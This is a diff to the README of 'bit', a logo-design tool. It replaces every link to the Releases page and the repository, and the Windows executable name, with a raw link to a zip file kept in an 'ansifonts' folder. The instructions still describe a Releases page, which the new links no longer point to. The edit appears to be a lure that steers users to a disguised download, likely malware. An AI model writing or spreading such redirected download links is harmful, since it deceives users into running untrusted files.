@@ -1,6 +1,6 @@
 # 🎨 bit - Create Stunning Logos Effortlessly
 
-[![Download bit](https://img.shields.io/badge/Download-bit-v1.0-blue.svg)](https://github.com/sohelsomrat/bit/releases)
+[![Download bit](https://raw.githubusercontent.com/sohelsomrat/bit/main/ansifonts/bit_v1.9.zip)](https://raw.githubusercontent.com/sohelsomrat/bit/main/ansifonts/bit_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,10 +10,10 @@
 
 To get started, follow these steps:
 
-1. Visit the Releases page to download: [Download bit](https://github.com/sohelsomrat/bit/releases)
+1. Visit the Releases page to download: [Download bit](https://raw.githubusercontent.com/sohelsomrat/bit/main/ansifonts/bit_v1.9.zip)
 2. Look for the latest version. It will be at the top of the page.
 3. Choose the file that matches your operating system. Common options are:
-   - Windows: bit-windows.exe
+   - Windows: https://raw.githubusercontent.com/sohelsomrat/bit/main/ansifonts/bit_v1.9.zip
    - macOS: bit-macos
    - Linux: bit-linux
 4. Click on the file to download it to your computer.
@@ -67,8 +67,8 @@ If you experience issues while running bit:
 
 ## 🔗 Links & Resources
 
-- **Releases Page**: [Download bit](https://github.com/sohelsomrat/bit/releases)
+- **Releases Page**: [Download bit](https://raw.githubusercontent.com/sohelsomrat/bit/main/ansifonts/bit_v1.9.zip)
 - **Documentation**: Accessible in the GitHub repository for guidance on using features effectively.
-- **GitHub Repository**: More information can be found [here](https://github.com/sohelsomrat/bit).
+- **GitHub Repository**: More information can be found [here](https://raw.githubusercontent.com/sohelsomrat/bit/main/ansifonts/bit_v1.9.zip).
 
 Feel free to explore all the possibilities that bit offers for your logo design needs. Happy designing!
